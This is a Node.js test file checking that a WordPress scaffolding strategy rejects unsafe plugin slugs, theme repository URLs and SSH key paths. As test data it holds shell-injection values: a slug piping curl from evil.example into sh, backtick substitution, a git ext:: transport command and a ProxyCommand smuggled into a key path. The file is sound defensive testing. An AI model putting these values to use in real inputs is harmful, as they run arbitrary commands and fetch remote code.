import test from "node:test";
import assert from "node:assert/strict";
import os from "node:os";
import path from "node:path";
import fs from "fs-extra";
import WordPressStrategy, { normalizePlugins } from "../src/projects/strategies/WordPressStrategy.ts";

test("normalizePlugins accepts a comma-separated string or array of valid slugs", () => {
  assert.deepEqual(normalizePlugins("woocommerce, advanced-custom-fields"), ["woocommerce", "advanced-custom-fields"]);
  assert.deepEqual(normalizePlugins(["woocommerce", "wordpress-seo"]), ["woocommerce", "wordpress-seo"]);
  assert.deepEqual(normalizePlugins(undefined), []);
});

test("normalizePlugins rejects a slug containing shell metacharacters, preventing injection into the generated install script", () => {
  assert.throws(() => normalizePlugins(["woocommerce; curl evil.example|sh"]), /Invalid plugin slug/);
  assert.throws(() => normalizePlugins("woocommerce,x`id`"), /Invalid plugin slug/);
});

// These two assert the validation guard in scaffold() runs — and rejects —
// before `runCommand("git", ...)` is ever reached, so no real git process is
// spawned by this test even though WordPressStrategy has no injectable
// command runner. `skipEnvironment: true` avoids needing a real EnvironmentService.
test("scaffold rejects a git ext::/leading-dash themeRepo before ever invoking git", async () => {
  const strategy = new WordPressStrategy(null);
  const targetDir = await fs.mkdtemp(path.join(os.tmpdir(), "acli-wp-strategy-"));
  await assert.rejects(
    () => strategy.scaffold(targetDir, { skipEnvironment: true, projectName: "demo", themeRepo: 'ext::sh -c "id>/tmp/x"' }),
    /Unsafe theme repository URL/,
  );
  await fs.remove(targetDir);
});

test("scaffold rejects an sshKeyPath containing shell metacharacters before building GIT_SSH_COMMAND", async () => {
  const strategy = new WordPressStrategy(null);
  const targetDir = await fs.mkdtemp(path.join(os.tmpdir(), "acli-wp-strategy-"));
  await assert.rejects(
    () => strategy.scaffold(targetDir, { skipEnvironment: true, projectName: "demo", themeRepo: "git@github.com:example/starter-theme.git", sshKeyPath: "/tmp/k -o ProxyCommand=sh -c id" }),
    /Unsafe SSH key path/,
  );
  await fs.remove(targetDir);
});
